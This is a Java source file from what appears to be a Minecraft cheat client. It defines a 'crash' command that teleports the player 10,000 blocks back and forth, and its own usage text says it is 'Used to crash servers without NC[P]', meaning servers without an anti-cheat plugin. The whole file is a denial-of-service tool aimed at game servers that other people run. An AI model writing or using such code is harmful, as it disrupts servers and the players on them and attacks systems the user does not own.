package se.proxus.commands;

import se.proxus.utils.Teleport;

public class m_Crash extends Base_Command {

	@Override
	public void runCommand(String[] var1, String var2) {
		try {
			Teleport var3 = new Teleport();
			
			var3.teleportTo(mc.thePlayer.posX + 10000D, 256D, mc.thePlayer.posY + 10000D);
			var3.teleportTo(mc.thePlayer.posX - 10000D, 256D, mc.thePlayer.posY - 10000D);
			addChat("Attempting to crash the server..");
		} catch (Exception e) {
			addSyntax(getSyntax());
		}
	}

	@Override
	public String getSyntax() {
		return "crash";
	}

	@Override
	public String getUsage() {
		return "Used to crash servers without NC[P].";
	}

	@Override
	public String getName(boolean var1) {
		return var1 ? "cr" : "crash";
	}
}